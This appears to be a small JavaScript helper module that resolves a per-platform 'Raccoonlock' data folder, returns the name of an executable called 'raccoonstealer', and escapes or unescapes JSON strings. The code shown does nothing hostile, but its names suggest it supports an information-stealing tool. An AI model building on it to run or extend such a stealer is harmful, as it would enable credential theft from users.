class interfaces{
	constructor(platform){
		this.platform = platform;
	}

	getPath(){
		if (this.platform === "win32"){
			const path = `${process.env.LOCALAPPDATA}\\Raccoonlock`;
			return path;
		}else if(this.platform === "linux"){
			const os = require("os");
			const path = `${os.homedir()}/.raccoonlock`;
			return path;
		}
	}

	getStealer(){
		if (this.platform === "win32"){
			return 'raccoonstealer.exe';
		}else if(this.platform === "linux"){
			return './raccoonstealer';
		}
	}

	getCorrectJSON(string){
		let last = string.lastIndexOf('}');
		if (last !== -1) {
			let jsonOnly = string.substring(0, last + 1);
			jsonOnly = jsonOnly.replaceAll(`\\"`, `"`);
			jsonOnly = jsonOnly.replaceAll(`\\$`, `$`);
			return jsonOnly;
		}else{
			return `${string} is not a valid JSON string`;
		}
	}

	makeCorrectJSON(string){
		let newString = string.replaceAll(`"`, `\"`);
		newString = newString.replaceAll(`$`, `\$`);
		return newString;
	}
}

module.exports = interfaces;
